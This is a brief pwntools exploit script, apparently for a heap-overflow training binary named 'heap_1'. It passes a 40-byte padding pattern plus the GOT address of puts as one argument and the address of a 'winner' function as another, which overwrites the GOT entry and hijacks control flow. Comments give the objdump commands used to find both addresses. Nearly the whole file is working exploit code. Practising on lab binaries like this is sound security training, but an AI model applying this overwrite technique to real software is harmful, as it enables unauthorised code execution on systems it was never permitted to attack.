from pwn import *

# Set up pwntools for the correct architecture
context(arch='i386', os='linux')
elf = context.binary = ELF('heap_1')

# Function to start the exploit against the target
def start(arg1,arg2, *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path, arg1,arg2], gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path, arg1, arg2], *a, **kw)

# Specify GDB script for debugging
gdbscript = '''
b main
continue
'''
# Create the payload with 40 bytes of data and the address of puts function.
arg1 = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\x88\x33\x40" #param 1 objdump -R heap_1|grep puts
#payload = payload.replace(b'\x00', b'')
arg2 = "\x75\x12\x40" #param2 address of winner function. #objdump -D heap_1| grep winner

# Start the process with the payload as a command-line argument
io = start(arg1,arg2)

# Interact with the process
io.interactive()
